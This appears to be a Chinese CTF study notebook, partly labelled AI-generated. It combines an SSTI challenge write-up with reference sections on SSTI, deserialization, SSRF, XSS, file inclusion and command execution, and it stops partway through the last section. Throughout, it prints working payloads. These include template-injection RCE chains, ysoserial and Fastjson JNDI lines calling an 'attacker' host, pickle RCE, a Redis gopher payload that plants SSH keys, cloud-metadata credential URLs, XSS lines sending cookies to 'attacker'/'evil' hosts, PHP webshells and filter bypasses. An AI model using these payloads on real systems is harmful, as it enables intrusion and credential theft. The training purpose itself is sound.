r = requests.get(f"{BASE}/file.php?f=/flag")
flag = r.text.split('<img')[0].strip()
print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
```

---

## SSTI 模板注入 — Jinja2 config 泄露

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | Web - 服务端模板注入 (SSTI) |
| 难度 | 入门 |
| 日期 | 2026-08-07 |
| 目标 | `http://160.202.254.160:12115/?flag=` |

### 题目页面

首页提示"You need pass in a parameter named flag"，页面标题为"Simple SSTI"。HTML 注释中隐藏提示："You know, in the flask, We often set a secret_key variable."

### 解题思路

**1. 信息收集**

- 页面源码 `<title>Simple SSTI</title>` 直白提示考点
- 参数名为 `flag`，GET 方式传参
- HTML 注释暗示 Flask 框架的 `secret_key` 变量
- 传 `?flag=hello123` 时页面原样回显 → 用户输入被直接渲染

**2. SSTI 检测**

注入数学表达式 `{{7*7}}`（花括号需 URL 编码为 `%7B%7B7*7%7D%7D`），页面返回 `49`：

```
?flag={{7*7}}  →  49  ✓ 确认存在模板注入
```

**3. 引擎识别**

注入 `{{7*'7'}}`，返回 `7777777`（字符串乘法），确认为 **Jinja2 (Flask)**：

```
?flag={{7*'7'}}  →  7777777  ✓ Jinja2 特征

区别: Twig 引擎中 {{7*'7'}} → 49（类型转换而非字符串重复）
```

**4. 读取 config 获取 flag**

Jinja2 模板上下文中可以直接访问 `config` 对象，它包含 Flask 的所有配置项。注入 `{{config}}` 即可输出完整配置：

```
?flag={{config}}
```

响应（HTML 实体解码后）：

```
<Config {'ENV': 'production', 'DEBUG': True, 'SECRET_KEY': 'flag{34c812fc9e6bc952528326eb0a7a478e}', ...}>
```

`SECRET_KEY` 即为 flag。

**5. 利用流程图**

```
[1] 访问首页 → 发现参数名 flag，标题 "Simple SSTI"
[2] 查看源码 → HTML 注释提示 Flask secret_key
[3] ?flag={{7*7}} → 49 → 确认 SSTI
[4] ?flag={{7*'7'}} → 7777777 → 确认 Jinja2
[5] ?flag={{config}} → SECRET_KEY = flag{...}
```

### 解题 Payload

```
# 检测
?flag=%7B%7B7*7%7D%7D          → 49

# 引擎识别
?flag=%7B%7B7*%277%27%7D%7D    → 7777777

# 读取 flag (SECRET_KEY)
?flag=%7B%7Bconfig%7D%7D       → Config {... SECRET_KEY: 'flag{...}' ...}
```

### 运行结果

```
[+] {{7*7}} → 49  ✓ 确认存在 SSTI
[+] {{7*'7'}} → 7777777  ✓ 确认为 Jinja2 (Flask)
[+] SECRET_KEY = flag{34c812fc9e6bc952528326eb0a7a478e}
```

Flag: `flag{34c812fc9e6bc952528326eb0a7a478e}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| SSTI 模板注入 | 用户输入被作为模板表达式执行，`render_template_string()` 直接拼接用户输入是典型漏洞 |
| Jinja2 引擎识别 | `{{7*'7'}}` 在 Jinja2 中返回 `7777777`（字符串乘法），在 Twig 中返回 `49`（数值乘法） |
| config 对象 | Jinja2 模板上下文中可直接访问 Flask `config` 对象，包含 SECRET_KEY 等敏感配置 |
| URL 编码 | 花括号 `{` `}` 需编码为 `%7B` `%7D`，引号 `'` 需编码为 `%27`，否则被浏览器/框架解析 |
| SECRET_KEY 泄露 | Flask SECRET_KEY 用于 session 签名，泄露后可伪造 session，CTF 中常直接作为 flag |

### 延伸利用链（当 config 被过滤时）

本题 `config` 未被过滤，直接读取即可。当 `config` 关键词被过滤时，可使用以下替代链：

```python
# 方法1: 通过 cycler 全局函数 → os 模块 → 命令执行
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}

# 方法2: 通过 lipsum 全局函数 → os 模块 → 命令执行
{{lipsum.__globals__.os.popen('cat /flag').read()}}

# 方法3: 通过 request 对象 → Flask app → config
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['SECRET_KEY']}}

# 方法4: 遍历 __subclasses__ 找到 os._wrap_close
{{ ''.__class__.__mro__[1].__subclasses__()[索引].__init__.__globals__['system']('cat /flag') }}

# 方法5: get_flashed_messages → __builtins__ → eval
{{ get_flashed_messages.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()") }}
```

### 绕过技巧总结

| 过滤内容 | 绕过方法 |
|---------|---------|
| `.` 被过滤 | 用 `['']` 替代：`['__class__']` 代替 `.__class__` |
| `_` 被过滤 | 用 `\x5f` 或 `|attr('_class_')` 绕过 |
| `os` 被过滤 | 用 `\x6f\x73` 或字符串拼接 `'o'+'s'` |
| `{{` 被过滤 | 用 `{% if ... %}` 或 `{% set %}` |
| `config` 被过滤 | 用 `request.application` 链或全局函数链 |
| 引号被过滤 | 用 `request.args` 传参：`{{ ()|attr(request.args.a) }}` |

### 同类变体与扩展

- 若 `{{` 被过滤，尝试 `{%print(config)%}` （Jinja2 标签语法）
- 若需命令执行而非读配置，通过 `os.popen('命令').read()` 或 `subprocess.check_output()`
- 若 Flask debug 模式开启，可通过 SSTI 触发错误页获取更多信息
- 若使用 `render_template()` 而非 `render_template_string()`，模板文件中仍可注入（模板文件可控场景）
- Docker 环境中 flag 可能在 `/flag`、`/flag.txt`、环境变量 `FLAG` 中，需配合命令执行
- 利用 SSTI 读取 `app.py` 源码：`{{lipsum.__globals__.os.popen('cat app.py').read()}}` 获取完整源码

### 解题脚本

完整脚本：[Web/21-ssti-jinja2/solve.py](Web/21-ssti-jinja2/solve.py)

---

---

## SSTI 模板注入

> 补充日期：2026-08-04 | 优先级：高 | 对应附录D缺口

### 基本概念

模板注入（Server-Side Template Injection, SSTI）是指服务端将用户输入直接作为模板表达式执行，导致攻击者可以执行任意代码。与SQL注入不同，SSTI发生在模板引擎层面。

常见模板引擎及识别特征：

| 模板引擎 | 语言 | 识别特征 | 调试表达式 |
|----------|------|----------|-----------|
| Jinja2 | Python (Flask) | `{{ }}` 和 `{% %}` | `{{ 7*7 }}` → 49 |
| Twig | PHP (Symfony) | `{{ }}` 和 `{% %}` | `{{ 7*'7' }}` → 49 |
| Smarty | PHP | `{$ }` | `{$left}` |
| FreeMarker | Java | `${ }` 和 `<# >` | `${7*7}` → 49 |
| Velocity | Java | `#set()` `$` | `#set($a=7*7)` |
| Mako | Python | `${ }` | `${7*7}` → 49 |

### 快速检测流程

```
输入 {{7*7}} → 返回 49 → 确认模板注入
输入 {{7*'7'}} → 返回 49 (Twig) / 7777777 (Jinja2)
输入 ${7*7} → 返回 49 → 可能是 FreeMarker/Java模板
```

### Jinja2 (Flask) 利用链

**层级递进**：

1. **基本执行**：`{{ }}` 中执行 Python 表达式
2. **读取配置**：`{{ config }}` → 获取 Flask 配置（含 SECRET_KEY）
3. **访问内置对象**：通过 Python 的特殊属性链找到 os 模块
4. **命令执行**：利用 `os.popen()` 或 `subprocess` 执行系统命令

**常用利用链（Python 3）**：

```python
# 方法1：通过 __subclasses__ 找到 os._wrap_close
{{ ''.__class__.__mro__[1].__subclasses__()[索引].__init__.__globals__['system']('id') }}

# 方法2：通过 config 对象
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# 方法3：通过 request 对象
{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['SECRET_KEY'] }}

# 方法4：通过 cycler / lipsum / joiner（内置全局函数）
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}

# 方法5：通过 get_flashed_messages
{{ get_flashed_messages.__globals__.__builtins__.eval('import("os").popen("id").read()') }}
```

**通用命令执行（推荐，适用性最广）**：

```python
# 遍历 __subclasses__ 找到可利用类
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}
```

**绕过过滤的技巧**：

| 过滤内容 | 绕过方法 |
|---------|---------|
| `.` 被过滤 | 用 `['']` 替代：`['__class__']` |
| `_` 被过滤 | 用 `\x5f` 或 `|attr('')` 绕过 |
| `os` 被过滤 | 用 `\x6f\x73` 或字符串拼接 `'o'+'s'` |
| `{{` 被过滤 | 用 `{% if ... %}` 或 `{% set %}` |
| 引号被过滤 | 用 `request.args` 传参：`{{ ().__class__ }}` 用 `{{ ()|attr(request.args.a) }}` |

**request 绕过法（最灵活）**：

```python
# URL: /?cmd=__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()
# 注入点: {{ ()|attr(request.args.cmd) }}
```

### Twig (PHP) 利用链

```twig
# 基本执行
{{ 7*'7' }}  {# 输出 49 #}

# 命令执行
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}

# 或
{{ ['id']|filter('system') }}
```

### FreeMarker (Java) 利用链

```ftl
# 基本执行
${7*7}

# 命令执行
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# 或
[#assign cmd="freemarker.template.utility.Execute"?new()] ${cmd("id")}
```

### SSTI 防御

- 最根本：不将用户输入作为模板内容渲染
- Flask 中使用 `render_template()` 而非 `render_template_string()` 拼接用户输入
- 使用沙箱模式限制模板中的可用函数
- 对用户输入进行严格白名单校验

### 同类扩展

- Pug (Node.js)：`#{7*7}`，利用 `global.process.mainModule.require('child_process').execSync('id')`
- ERB (Ruby)：`<%= 7*7 %>`，利用 `<%= system('id') %>`

> AI生成

---

---

## 反序列化漏洞

> 补充日期：2026-08-04 | 优先级：高 | 对应附录D缺口

### 基本概念

反序列化（Deserialization）是将序列化后的数据还原为程序对象的过程。当应用直接反序列化不可信数据时，攻击者可构造恶意序列化数据，利用程序中已有的代码链（gadget chain）在反序列化过程中执行任意操作。

### PHP 反序列化

**核心机制**：PHP 的 `unserialize()` 函数将序列化字符串还原为对象。还原时自动调用魔术方法（magic methods），形成利用链。

**魔术方法调用顺序**：

```
unserialize() → __wakeup() → __destruct()

# 对象销毁时
对象生命周期结束 → __destruct()

# 对象当作字符串使用时
echo $obj → __toString()

# 对象当作函数调用时
$obj() → __invoke()

# 访问不可访问属性时
$obj->prop → __get()
$obj->prop = val → __set()

# 调用不可访问方法时
$obj->method() → __call()
```

**典型 POP 链构造流程**：

1. **寻找终点（sink）**：找到能执行命令或读写文件的方法，如 `eval()`、`system()`、`file_put_contents()`、`include()`
2. **寻找触发点（entry）**：`__wakeup()`、`__destruct()`、`__toString()` 等魔术方法
3. **连接中间件（gadget）**：通过魔术方法间的调用关系，从触发点一步步到达终点

**示例 POP 链**：

```php
// 目标代码中存在的类
class ShowSource {
    public function __toString() {
        return highlight_file($this->source, true);
    }
}

class Trigger {
    public $test;
    public function __destruct() {
        echo $this->test;  // 触发 __toString
    }
}

// POP链构造
$chain = new Trigger();
$chain->test = new ShowSource();
$chain->test->source = '/flag';

// 序列化
echo serialize($chain);
// O:7:"Trigger":1:{s:4:"test";O:11:"ShowSource":1:{s:6:"source";s:5:"/flag";}}
```

**绕过 `__wakeup()`**（CVE-2016-7124）：

```
# PHP < 5.6.25 / 7.0 < 7.0.10
# 将对象属性个数改大于实际值，__wakeup() 不会被调用
O:4:"User":2:{s:3:"cmd";s:6:"whoami";}  // 实际1个属性，写2
```

**Phar 反序列化**：

```php
// phar 文件本质是一种归档格式，metadata 部分会自动反序列化
// 触发条件：phar.readonly = Off（生成时），读取时任何文件函数都触发

// 生成恶意 phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');  // 伪装文件头
$obj = new EvilClass();
$obj->cmd = 'system("id");';
$phar->setMetadata($obj);  // 恶意对象
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

// 触发方式（无需 unserialize 调用）
file_exists('phar://evil.phar');
file_get_contents('phar://evil.phar');
is_dir('phar://evil.phar');
// ... 任何接受 stream wrapper 的文件函数
```

**Phar 绕过技巧**：

| 防御方式 | 绕过方法 |
|---------|---------|
| 禁止 .phar 后缀 | 改后缀为 .jpg/.gif/.png 等，phar 协议不依赖后缀 |
| 文件头检测 | `setStub` 中设置 GIF89a / PNG 头绕过 |
| `phar.readonly=On` | 仅影响生成，不影响利用；用 GIF 头 + phar 内容组合绕过上传 |

### Java 反序列化

**核心机制**：Java 的 `ObjectInputStream.readObject()` 还原序列化对象。反序列化时调用类的 `readObject()`、`readResolve()` 等方法。

**高频利用链**：

| 利用链 | 影响组件 | 效果 |
|-------|---------|------|
| CommonsCollections1 | Apache Commons Collections ≤3.2.1 | 命令执行 |
| CommonsCollections6 | Apache Commons Collections ≤3.2.1 | 命令执行（不限 JDK） |
| CommonsCollections7 | Apache Commons Collections ≤3.2.1 | 命令执行（Hashtable 触发） |
| CommonsBeanutils1 | Apache Commons BeanUtils | 命令执行 |
| JDK7u21 | JDK ≤7u21 | 命令执行 |
| Spring1 | Spring Framework | 命令执行 |
| Groovy1 | Groovy <2.3.9 | 命令执行 |

**快速利用工具**：

- **ysoserial**：生成各利用链的序列化数据
  ```bash
  # 生成 CommonsCollections6 利用链
  java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/$(whoami)' | base64
  ```
- **Shiro550**：Apache Shiro <=1.2.4 使用硬编码 AES 密钥
  ```python
  # Shiro rememberMe cookie 反序列化
  # 密钥: kPH+bIxk5D2deZiIxcaaaA== (默认)
  # 流程: 序列化对象 → AES-CBC加密 → Base64编码 → 设置为 rememberMe cookie
  ```
- **Fastjson**：JSON 反序列化，通过 `@type` 指定类
  ```json
  // JNDI 注入利用
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
  ```

### Python 反序列化

**pickle 模块**：

```python
import pickle
import os

# 恶意 pickle 数据
class Evil:
    def __reduce__(self):
        return (os.system, ('id',))

# 序列化
payload = pickle.dumps(Evil())
# 反序列化时自动执行 os.system('id')
pickle.loads(payload)
```

**`__reduce__` 协议**：反序列化时调用 `__reduce__()` 返回的 `(callable, args)` 即 `callable(*args)`。

### 识别特征

- PHP：看到 `unserialize()` 或 phar 文件操作
- Java：看到 `ObjectInputStream` / `XMLDecoder` / 请求中有 `rO0AB`（Base64 的 Java 序列化头 `0xACED0005`）
- Python：看到 `pickle.loads()` / `yaml.load()` / `json` 配合自定义对象

> AI生成

---

---

## SSRF 服务端请求伪造

> 补充日期：2026-08-04 | 优先级：高 | 对应附录D缺口

### 基本概念

服务端请求伪造（Server-Side Request Forgery, SSRF）是指攻击者利用服务端代码中的请求功能，让服务器代替攻击者发起网络请求，从而访问内网资源、云服务元数据或本机服务。

### 常见触发点

- 图片预览 / URL 预览功能（传入 URL，服务器抓取内容）
- Webhook 回调地址配置
- PDF 导出（渲染外部资源）
- 文件代理 / 翻译代理
- 远程文件包含（`file_get_contents` 传入 URL）

### 利用方向

**1. 内网端口扫描**：

```
http://127.0.0.1:80
http://127.0.0.1:22
http://127.0.0.1:6379  → 返回差异判断端口开放
```

**2. 读取本地文件**：

```
file:///etc/passwd
file:///flag
```

**3. 访问云服务元数据**：

```
# AWS EC2
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 阿里云
http://100.100.100.200/latest/meta-data/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/  (需 Header: Metadata-Flavor: Google)
```

**4. 攻击内网服务**：

```
# Redis 未授权（通过 dict/gopher 协议）
dict://127.0.0.1:6379/INFO

# 写 SSH 公钥到 Redis
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$N%0d%0a<SSH公钥内容>%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 绕过技巧

| 防御方式 | 绕过方法 |
|---------|---------|
| 禁止 127.0.0.1 | 使用 `0` / `[::1]` / `127.1` / `127.0.0.2` |
| 禁止内网 IP | 十进制 IP：`2130706433` = 127.0.0.1 |
| 域名白名单 | DNS Rebinding：域名首次解析到合法 IP，第二次解析到内网 IP |
| 禁止 http 协议 | 使用 `gopher://` / `dict://` / `file://` |
| 正则匹配 IP | 使用 `0x7f000001`（十六进制）/ `017700000001`（八进制） |
| 限制重定向 | 利用 `@`：`http://合法域名@127.0.0.1` |
| 仅校验域名 | 利用短链接服务跳转到内网地址 |

**302 跳转绕过**：

```python
# 在自己服务器上部署跳转
# redirect.php
<?php header("Location: file:///etc/passwd"); ?>
# 或
<?php header("Location: gopher://127.0.0.1:6379/_INFO"); ?>
```

### gopher 协议扩展利用

gopher 协议可以伪造任意 TCP 协议数据包，不仅能攻击 Redis，还能攻击 FastCGI、MySQL 等：

```
# FastCGI 利用（执行 PHP 代码）
gopher://127.0.0.1:9000/_[FastCGI协议数据]

# MySQL 无密码利用
gopher://127.0.0.1:3306/_[MySQL协议数据]
```

### SSRF 防御

- 白名单限制可请求的域名和 IP 段
- 禁用非 HTTP/HTTPS 协议（gopher/dict/file）
- 禁止 30x 重定向跟随，或对重定向目标重新校验
- 使用 DNS 缓存绑定防止 DNS Rebinding
- 内网元数据地址（169.254.169.254 等）加入黑名单

> AI生成

---

---

## XSS 跨站脚本攻击

> 补充日期：2026-08-04 | 优先级：高 | 对应附录D.2 Web安全考点

### 基本概念

跨站脚本攻击（Cross-Site Scripting, XSS）是指攻击者向 Web 页面中注入恶意客户端脚本，当其他用户浏览该页面时，脚本在用户浏览器中执行，从而窃取 Cookie、会话令牌或执行其他操作。XSS 是 OWASP Top 10 中的核心漏洞类型。

### 三种类型

| 类型 | 英文 | 特征 | 触发条件 |
|------|------|------|---------|
| 反射型 | Reflected XSS | 恶意脚本包含在 URL 参数中，服务端反射到响应页面 | 用户点击恶意链接 |
| 存储型 | Stored XSS | 恶意脚本存储在服务端（数据库/文件），所有访问用户均触发 | 留言板/评论区/用户名 |
| DOM 型 | DOM-based XSS | 恶意脚本不经过服务端，由前端 JavaScript 操作 DOM 触发 | 前端直接使用 location 等输入 |

### 常见注入点与 Payload

**基础检测**：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

**绕过过滤**：

| 过滤内容 | 绕过方法 |
|---------|---------|
| `<script>` 标签 | `<scr<script>ipt>` / `<ScRiPt>` / `<script/onload>` |
| `alert` 关键字 | `confirm(1)` / `prompt(1)` / `window['al'+'ert'](1)` |
| 引号 | 使用反引号 `` ` `` 或不使用引号 |
| 括号 | `throw` 语句 / `onerror=alert` （部分场景不需要括号）|
| 大小写 | `<ScRiPt>` / `<IMG SRC=x ONerror=alert(1)>` |
| 关键词拆分 | `<scri\x00pt>` (NULL字节) / `<script\x20src=...>` |
| 编码绕过 | `&#x3c;script&#x3e;` (HTML实体) / `javascript:alert(1)` |

**各标签利用方式**：

```html
<!-- script 标签 -->
<script>document.location='http://attacker/?c='+document.cookie</script>

<!-- img 标签 -->
<img src=x onerror="new Image().src='http://attacker/?c='+document.cookie">

<!-- svg 标签 -->
<svg onload="fetch('http://attacker/?c='+document.cookie)">

<!-- a 标签 -->
<a href="javascript:alert(document.cookie)">click</a>

<!-- input 标签 -->
<input onfocus="alert(document.cookie)" autofocus>

<!-- details 标签（较少被过滤）-->
<details open ontoggle="alert(document.cookie)">
```

### 存储型 XSS 利用场景

```python
# 1. 注入留言/评论
# 提交内容: <script>fetch('http://attacker:8080/?cookie='+document.cookie)</script>

# 2. 等待管理员/其他用户访问页面

# 3. 接收 Cookie
# 用 Python 监听: python3 -m http.server 8080
# 或用 XSS 平台（如 XSS Platform/BeEF）接收
```

### DOM 型 XSS 常见 Sink

```javascript
// 危险的 DOM 操作（Sink）
document.write(location.hash)       // location.hash 可控
element.innerHTML = location.search  // 直接赋值 innerHTML
eval(location.hash.substr(1))        // eval 执行
$('<div>').html(location.hash)       // jQuery html()
document.getElementById('x').src = location.hash  // 改变 src
```

**常用 Source（输入来源）**：
`location.hash`、`location.search`、`location.href`、`document.referrer`、`window.name`、`postMessage`

### XSS 利用 - Cookie 窃取

```javascript
// 短 Payload（适用长度限制）
fetch('//evil/'+document.cookie)

// 带编码的 Payload
eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9hdHRhY2tlci8/Yz0nK2RvY3VtZW50LmNvb2tpZQ=='))

// 读取整个页面源码
fetch('//evil/'+encodeURIComponent(document.documentElement.outerHTML))
```

### XSS 防御

- **输出编码**：HTML 上下文用 `&lt; &gt; &amp;` 实体编码；JavaScript 上下文用 `\uXXXX` 编码
- **CSP（Content-Security-Policy）**：`default-src 'self'; script-src 'self'`，禁止内联脚本
- **HttpOnly Cookie**：`Set-Cookie: session=xxx; HttpOnly; Secure`，禁止 JavaScript 读取
- **输入校验**：白名单校验，不依赖黑名单
- **框架自带防护**：Vue/React 默认对变量进行 HTML 转义

### CTF 中 XSS 题常见模式

1. **Bot 访问**：提交 XSS Payload 后，平台 Bot 用浏览器访问你的页面，Bot 的 Cookie 中含 flag
2. **过滤绕过**：各种 WAF/黑名单过滤，需要组合绕过技巧
3. **CSP 绕过**：`script-src 'self'` → 利用同域 JSONP 接口或可控制的 JS 文件
4. **HttpOnly 绕过**：Cookie 设了 HttpOnly → 通过 XSS 获取页面内容（如 phpinfo 页面）而非 Cookie
5. **短 Payload**：Payload 长度受限时，用 `eval(name)` + `window.name` 传长 Payload

> AI生成

---

---

## 文件包含漏洞

> 补充日期：2026-08-04 | 优先级：高 | 对应附录D.2 Web安全考点

### 基本概念

文件包含漏洞（File Inclusion）是指应用通过用户输入动态包含文件时，未对输入进行严格校验，导致攻击者可以包含非预期文件。分为本地文件包含（LFI）和远程文件包含（RFI）。

### PHP 文件包含函数

| 函数 | 说明 | RFI 支持 |
|------|------|---------|
| `include()` | 包含失败产生警告，继续执行 | 需要 `allow_url_include=On` |
| `require()` | 包含失败产生致命错误，停止执行 | 需要 `allow_url_include=On` |
| `include_once()` | 同 include，但仅包含一次 | 需要 `allow_url_include=On` |
| `require_once()` | 同 require，但仅包含一次 | 需要 `allow_url_include=On` |

### LFI 利用

**1. 读取系统文件**：

```php
// 参数: ?page=../../../../etc/passwd
include($_GET['page']);

// 常见目标文件
/etc/passwd          # Linux 用户列表
/etc/shadow          # 密码哈希（需 root 权限）
/proc/self/environ   # 环境变量
/proc/self/cmdline   # 启动命令
/var/log/apache2/access.log  # Apache 访问日志
/var/log/nginx/access.log    # Nginx 访问日志
/etc/hosts
/flag                # CTF 常见路径
```

**2. 利用 PHP 协议封装器**：

| 协议 | 用途 | 示例 |
|------|------|------|
| `php://filter` | 读取文件源码（Base64编码） | `?page=php://filter/read=convert.base64-encode/resource=flag.php` |
| `php://input` | 读取 POST 原始数据 | `?page=php://input` + POST body: `<?php system('id');?>` |
| `data://` | 直接写入数据 | `?page=data://text/plain,<?php system('id');?>` |
| `data://` (Base64) | Base64 编码数据 | `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+` |
| `zip://` | 从 ZIP 中提取文件 | `?page=zip://shell.zip%23shell.php` |
| `phar://` | 从 phar 中提取文件 | `?page=phar://evil.phar/content.txt` |

**3. php://filter 读取源码（最常用）**：

```php
// 读取 PHP 文件源码（不会被 PHP 引擎执行）
?page=php://filter/read=convert.base64-encode/resource=config.php

// 返回 Base64 编码的源码，解码后查看
echo "base64_encoded_string" | base64 -d

// 其他过滤器
convert.iconv.utf-8.utf-16   # 编码转换
string.rot13                  # ROT13
convert.base64-decode         # 解码（可用于绕WAF）
```

**4. 日志包含（当无可用协议时）**：

```php
// 1. 在 User-Agent 中注入 PHP 代码
User-Agent: <?php system('id'); ?>

// 2. 包含 Apache/Nginx 日志
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/nginx/access.log

// 3. 日志中的 User-Agent 被 PHP 引擎执行
```

**5. Session 文件包含**：

```php
// 1. 找到 Session 存储路径（通常 /tmp/sess_SESSIONID 或 /var/lib/php/sessions/）
// 2. 找到可控的 Session 变量（如用户名写入 $_SESSION）
// 3. 包含 Session 文件
?page=/tmp/sess_abc123def456
```

**6. /proc/self/environ 包含**：

```
// 环境变量中包含 User-Agent，可以注入代码
?page=../../../../proc/self/environ
```

### RFI 利用

**前提**：`allow_url_include = On`（PHP 默认关闭）

```php
// 直接包含远程文件
?page=http://attacker/shell.txt
// shell.txt 内容: <?php system($_GET['cmd']); ?>

// 使用 data:// 协议（不需 allow_url_include，需 allow_url_fopen）
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

### 绕过技巧

| 防御方式 | 绕过方法 |
|---------|---------|
| 后缀拼接 `.php` | 路径截断：`../../../etc/passwd%00`（PHP <5.3.4）|
| 后缀拼接 `.php` | 路径溢出截断：超长路径（Linux 4096 字符截断）|
| 前缀拼接 `./` | 绝对路径：`/etc/passwd` |
| 目录限制 | `../` 跳转 |
| 过滤 `..` | 双写绕过：`....//` |
| 过滤 `php://` | 大小写：`PHP://` / URL 编码 |

### 文件包含与文件上传组合

```
1. 上传包含恶意代码的图片（图片马）
2. 利用文件包含漏洞包含该图片
3. 图片中的 PHP 代码被执行

# 图片马制作
echo 'GIF89a' > shell.gif
echo '<?php system($_GET['cmd']); ?>' >> shell.gif

# 包含
?page=upload/shell.gif
```

### 文件包含防御

- 白名单限制可包含的文件名
- 固定文件路径前缀，不允许目录跳转
- 关闭 `allow_url_include` 和 `allow_url_fopen`
- 使用 `realpath()` 规范化路径后校验

> AI生成

---

---

## 命令执行与代码执行

> 补充日期：2026-08-04 | 优先级：高 | 对应附录D.2 Web安全考点

### 概念区分

- **命令执行（Command Injection / RCE）**：注入操作系统命令，通过 `system()`、`exec()`、`shell_exec()`、`反引号` 等函数执行
- **代码执行（Code Injection）**：注入程序语言代码，通过 `eval()`、`assert()`、`preg_replace /e` 等函数执行

### PHP 命令执行

**危险函数**：

| 函数 | 说明 |
|------|------|
| `system()` | 执行命令并输出结果 |
| `exec()` | 执行命令，返回最后一行 |
| `shell_exec()` | 执行命令，返回完整输出 |
| `passthru()` | 执行命令并原始输出（二进制安全）|
| `反引号 \`cmd\`` | 等价于 `shell_exec()` |
| `popen()` | 打开进程管道 |
| `proc_open()` | 执行命令并打开输入输出管道 |
| `pcntl_exec()` | 执行程序 |

**命令拼接（注入点）**：

```bash
# 命令分隔符
cmd1; cmd2      # 顺序执行
cmd1 && cmd2    # cmd1成功后执行cmd2
cmd1 || cmd2    # cmd1失败后执行cmd2
cmd1 | cmd2     # 管道：cmd1输出作为cmd2输入
cmd1 & cmd2     # 后台执行cmd1，同时执行cmd2

# 命令替换
$(cmd)          # 执行cmd，结果替换到当前位置
`cmd`           # 同上
```

**绕过技巧**：

| 过滤内容 | 绕过方法 |
|---------|---------|
| 空格 | `${IFS}` / `$IFS$9` / `<` / `{cat,/flag}` |
| `cat` 命令 | `tac` / `more` / `less` / `head` / `tail` / `nl` / `sort` / `rev` / `od` / `xxd` |
| `flag` 关键字 | `fl''ag` / `fl""ag` / `fl\ag` / `f*` / `fl??.php` |
| 数字字母 | `$()` / 空变量拼接：`$(echo hello)` |
| `/` 路径分隔 | 环境变量替换 |
| 完全无字母数字 | 位运算构造 / `$(printf \x63\x61\x74)` |

**空格绕过示例**：

```bash
# 原始: cat /flag
# 过滤空格后:
cat${IFS}/flag
cat$IFS$9/flag
cat</flag         # 重定向读取
{cat,/flag}       # 花括号展开
```

**无字母数字 Web终端执行（PHP 7+）**：

```php
// 利用异或构造字母
<?php
$_ = (); // 空字符串
$__ = ('>' > '<'); // true = 1
// 通过位运算逐步构造 system('cat /flag')
// 工具: alpha3 / 无字母数字Web终端
```

### PHP 代码执行

**危险函数**：

| 函数 | 说明 | 示例 |
|------|------|------|
| `eval()` | 执行 PHP 代码 | `eval($_GET['cmd']);` |
| `assert()` | 断言（PHP 7前可执行代码）| `assert($_GET['cmd']);` |
| `preg_replace('/pattern/e')` | 正则替换的 e 修饰符 | `preg_replace('/.*/e', $_GET['cmd'], 'x');` |
| `create_function()` | 创建匿名函数 | `create_function('', $_GET['cmd']);` |
| `call_user_func()` | 调用回调函数 | `call_user_func('assert', $_GET['cmd']);` |
| `array_map()` | 数组映射 | `array_map('assert', [$_GET['cmd']]);` |
| `usort()` / `uasort()` | 自定义排序回调 | `usort([0,1], 'assert');` |

**常见 Payload**：

```php
// 代码执行
eval('phpinfo();');
assert('phpinfo()');                      // PHP < 7.0
preg_replace('/./e', 'phpinfo()', 'x');   // PHP < 7.0

// 一句话木马
eval($_POST['cmd']);                      // 经典一句话

// 无括号执行
eval(end(current(get_defined_vars())));   // 从 $_POST 中取值

// 利用文件名
eval(end(getallheaders()));                // 从 HTTP 头中取值
```

### Python 代码执行

```python
# eval / exec
eval(request.args.get('cmd'))
exec(request.args.get('cmd'))

# SSTI 已在前面章节补充（Jinja2 利用链）
# 但注意 SSTI 不是单纯的代码执行，是模板引擎层面的注入
```

### Java 代码执行

```java
// Runtime.exec
Runtime.getRuntime().exec("id");

// ProcessBuilder
new ProcessBuilder("id").start();

// 反射 + 方法调用
Class.forName("java.lang.Runtime")
    .getMethod("exec", String.class)
    .invoke(
        Class.forName("java.lang.Runtime")
            .getMethod("getRuntime").invoke(null),
        "id"
    );

// ScriptEngine (JS 引擎执行代码)
ScriptEngineManager sem = new ScriptEngineManager();
ScriptEngine se = sem.getEngineByName("js");
se.eval("java.lang.Runtime.getRuntime().exec('id')");
```

### 命令执行防御

- 不将用户输入拼接到命令中
